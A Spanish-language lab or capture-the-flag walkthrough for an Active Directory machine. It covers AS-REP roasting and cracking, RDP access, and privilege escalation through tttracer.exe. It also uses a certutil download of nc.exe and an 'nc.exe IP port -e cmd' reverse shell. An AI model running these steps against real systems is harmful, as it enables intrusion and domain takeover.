User.txt

Escanear la red:
nmap 192.168.56.0/24 -sn

crackmapexec smb 192.168.56.0/24 -> con este comando se averigua en que IP esta Domain Controller.

Apuntamos en /etc/hosts la IP del DC y del dominio:
    IP  genwin.local DC-Company 


Obtener listado usuarios con rpcclient:
rpcclient -U "genwin.local\username%password" IP_DC
    - enumdomusers y nos guardamos los nombres en un archivo 


Miramos si hay algun usuario con el que se pueda realizar un ataque ASREPRoast
GetNPUsers.py genwin.local/ -no-pass -usersfile file.txt 
Nos guardamos el hash en un fichero y lo rompemos con john:
john -w wordlist hash

ya nos podemos conectar al windows 10 con rdesktop:
rdesktop -u 'username@genwin.local' -p 'password' IP



Root.txt

Una vez nos conectamos con de forma remota, abrimos una powershell y empezamos con la enumeracion y busqueda de alguna vulnerabilidad que nos permita realizar la escalada de privilegios.

Una vez dentro, vemos los usuarios locales -> net user
 y vemos que hay uno con nuestro mismo nombre, intentamos hacer un runas con las misma credenciales:
runas /user:username powershell 

Miramos nuestros prvilegios:
    - whoami /all
    - net user username

Vemos que estamos dentro de un grupo diferente alo normal, vemos si nos da algo de infromacion su descripcion:
    net localgroup group_name 

En la descripcion pone que podemos ejecutar el binario tttracer.exe con privilegios administrador de la siguiente forma:
C:\Users\Administrator\Desktop\script.exe -ArgumentList 'Args'

Visitamos la pagina web lolbas: https://lolbas-project.github.io/# y buscamos el binario.
Y nos pone lo que tenemos que hacer para realizar la escalada.

Podemos ejecutar cualquier ejecutable, ya sea .exe o .bat. 
Primero nos descargamos nuestro binario nc.exe:
    - En nuestra PC -> python3 -m http.server
    - En la maquina victima -> certutil -f -urlcache -split http://IP:PORT/nc.exe -> El PORT por defecto es 8000

Ahora creamos un .bat para ejecutar el nc.exe:
    - Abrimos el notepad -> notepad.exe file.bat
        - C:\PATH\nc.exe IP port -e cmd

Probamos si funciona haciendo un nc en nustra maquina y ejecutando el file.bat.

Ahora que ya esta todo preparado, ejecutamos el binario como dice lolbas:
En nuestra terminal de linux ejecutamos:
    - nc -lvp PORT

Este es el comando:
    - tttracer.exe C:\path\lalala.bat
pero tenemos que poner lo siguiente:
    -  C:\Users\Administrator\Desktop\script.exe -ArgumentList 'C:\path\lalala.bat'

Una vez somos administrador, es un escritorio, se puede ver un archivo en el que esta su contraseña. Ya podemos conectarnos al DC como administrador con rdesktop y atacar a todo el dominio.
